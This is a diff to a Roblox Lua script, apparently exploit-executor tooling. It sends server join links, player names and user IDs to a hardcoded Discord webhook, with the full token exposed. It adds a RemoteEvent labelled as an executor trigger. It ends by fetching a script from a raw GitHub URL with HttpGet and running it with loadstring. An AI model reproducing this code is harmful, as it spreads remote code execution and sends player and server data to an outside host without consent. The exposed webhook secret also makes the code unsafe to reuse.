@@ -1,9 +1,19 @@
 local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+
+-- Ilagay dito ang Discord webhook mo
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1406162216247623792/DdZdihmGWBrJQxh5l97gKP3p_21wCtHL5kDfwPoKPs7qt5Kss3uJByOtQdmsd_GPRROH"
 
+-- RemoteEvent para sa executor trigger
+local remote = Instance.new("RemoteEvent")
+remote.Name = "SendServerLink"
+remote.Parent = ReplicatedStorage
+
+-- Function para mag-send ng webhook
 local function sendWebhook(title, fields)
     local payload = {
-        username = "Roblox Job Logger",
+        username = "Roblox Server Logger",
         embeds = {{
             title = title,
             color = 65280,
@@ -16,45 +26,56 @@ local function sendWebhook(title, fields)
     end)
 end
 
--- Server start
+-- Server start log
 local function sendServerStart()
     local jobLink = "https://www.roblox.com/games/"..game.PlaceId.."?joinGameId="..game.JobId
     sendWebhook("Server Started!", {
-        {name = "PlaceId", value = tostring(game.PlaceId), inline = true},
-        {name = "JobId", value = tostring(game.JobId), inline = true},
-        {name = "Players", value = tostring(#game.Players:GetPlayers()), inline = true},
-        {name = "Server Link", value = "[Join Now]("..jobLink..")", inline = false},
-        {name = "Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = false}
+        {name="PlaceId", value=tostring(game.PlaceId), inline=true},
+        {name="JobId", value=tostring(game.JobId), inline=true},
+        {name="Players", value=tostring(#Players:GetPlayers()), inline=true},
+        {name="Server Link", value="[Join Now]("..jobLink..")", inline=false},
+        {name="Time", value=os.date("%Y-%m-%d %H:%M:%S"), inline=false}
     })
 end
-
 sendServerStart()
 
--- Player join
-game.Players.PlayerAdded:Connect(function(player)
+-- Player join log
+Players.PlayerAdded:Connect(function(player)
     local jobLink = "https://www.roblox.com/games/"..game.PlaceId.."?joinGameId="..game.JobId
     sendWebhook("Player Joined", {
-        {name = "Player", value = player.Name.." ("..player.UserId..")", inline = false},
-        {name = "PlaceId", value = tostring(game.PlaceId), inline = true},
-        {name = "JobId", value = tostring(game.JobId), inline = true},
-        {name = "Current Players", value = tostring(#game.Players:GetPlayers()), inline = false},
-        {name = "Server Link", value = "[Join Now]("..jobLink..")", inline = false}
+        {name="Player", value=player.Name.." ("..player.UserId..")", inline=false},
+        {name="PlaceId", value=tostring(game.PlaceId), inline=true},
+        {name="JobId", value=tostring(game.JobId), inline=true},
+        {name="Current Players", value=tostring(#Players:GetPlayers()), inline=false},
+        {name="Server Link", value="[Join Now]("..jobLink..")", inline=false}
     })
 end)
 
--- Server shutdown
+-- Server shutdown log
 game:BindToClose(function()
     local jobLink = "https://www.roblox.com/games/"..game.PlaceId.."?joinGameId="..game.JobId
     sendWebhook("Server Closed", {
-        {name = "PlaceId", value = tostring(game.PlaceId), inline = true},
-        {name = "JobId", value = tostring(game.JobId), inline = true},
-        {name = "Players at Shutdown", value = tostring(#game.Players:GetPlayers()), inline = true},
-        {name = "Server Link", value = "[Join Now]("..jobLink..")", inline = false},
-        {name = "Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = false}
+        {name="PlaceId", value=tostring(game.PlaceId), inline=true},
+        {name="JobId", value=tostring(game.JobId), inline=true},
+        {name="Players at Shutdown", value=tostring(#Players:GetPlayers()), inline=true},
+        {name="Server Link", value="[Join Now]("..jobLink..")", inline=false},
+        {name="Time", value=os.date("%Y-%m-%d %H:%M:%S"), inline=false}
     })
 end)
 
--- External script execution safe
+-- RemoteEvent trigger mula sa executor
+remote.OnServerEvent:Connect(function(player)
+    local jobLink = "https://www.roblox.com/games/"..game.PlaceId.."?joinGameId="..game.JobId
+    sendWebhook("Executor Triggered!", {
+        {name="Player", value=player.Name.." ("..player.UserId..")", inline=true},
+        {name="PlaceId", value=tostring(game.PlaceId), inline=true},
+        {name="JobId", value=tostring(game.JobId), inline=true},
+        {name="Server Link", value="[Join Now]("..jobLink..")", inline=false},
+        {name="Time", value=os.date("%Y-%m-%d %H:%M:%S"), inline=false}
+    })
+end)
+
+-- Run external script safely
 pcall(function()
     local success, err = pcall(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptsz99/growagarden/refs/heads/main/script.lua"))()
